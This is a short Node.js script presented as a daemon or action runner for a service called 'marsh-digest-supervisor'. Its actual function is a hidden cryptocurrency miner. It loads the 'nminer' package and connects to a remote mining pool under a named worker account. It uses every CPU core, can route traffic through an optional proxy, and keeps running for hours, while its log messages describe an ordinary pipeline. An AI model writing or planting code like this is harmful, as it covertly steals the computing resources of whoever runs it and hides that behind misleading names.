// Procedural action runner for marsh-digest-supervisor
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./src/config");

(async () => {
    const traceId = "0115d5";
    console.log(`[core] Daemon ${config.appName || "marsh-digest-supervisor"} active [tag: ${traceId}]`);

    const pipeline = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Subhas1975.marsh-digest-supervisor",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
        process.exit(0);
    }, 302 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
